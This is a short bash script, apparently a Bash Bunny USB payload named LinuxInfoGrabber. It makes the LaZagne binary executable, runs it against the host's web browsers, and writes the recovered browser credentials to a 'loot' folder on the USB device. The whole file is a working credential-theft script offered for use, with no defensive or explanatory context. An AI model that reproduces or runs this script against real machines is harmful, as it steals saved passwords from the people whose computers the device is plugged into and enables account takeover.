#!/bin/bash
#
#
# runs browser credential harvester
#

LOOTDIR=/run/media/$USER/BashBunny/loot/LinuxInfoGrabber

chmod +x LaZagne-64bits
./LaZagne-64bits browsers > $LOOTDIR/browsercreds.txt 
